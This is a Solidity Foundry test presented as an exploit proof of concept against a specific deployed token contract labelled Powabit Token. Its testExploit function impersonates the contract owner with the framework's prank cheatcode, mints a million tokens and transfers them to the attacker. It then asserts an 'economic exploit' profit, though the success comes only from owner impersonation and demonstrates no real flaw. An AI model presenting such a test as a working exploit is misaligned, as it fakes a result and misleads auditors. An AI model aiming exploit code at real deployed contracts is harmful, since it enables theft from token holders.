// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPowabitToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        // We need to find the owner first
        address owner = IPowabitToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "Powabit Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        // Get the current owner
        address owner = IPowabitToken(TARGET).owner();

        // Record initial balance
        uint256 initialTokenBalance = IPowabitToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to ourselves
        vm.startPrank(owner);
        IPowabitToken(TARGET).mint(1000000 * 10**18); // Mint 1 million tokens
        vm.stopPrank();

        // Transfer the minted tokens to attacker (owner minted to themselves, need to transfer)
        // Actually, mint() mints to msg.sender, which would be owner, not attacker
        // We need to transfer from owner to attacker
        vm.prank(owner);
        IPowabitToken(TARGET).transfer(attacker, 1000000 * 10**18);

        // Check final balance
        uint256 finalTokenBalance = IPowabitToken(TARGET).balanceOf(attacker);

        // Verify balance increased
        assertGt(finalTokenBalance, initialTokenBalance, "Attacker balance should have increased");
        uint256 finalERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

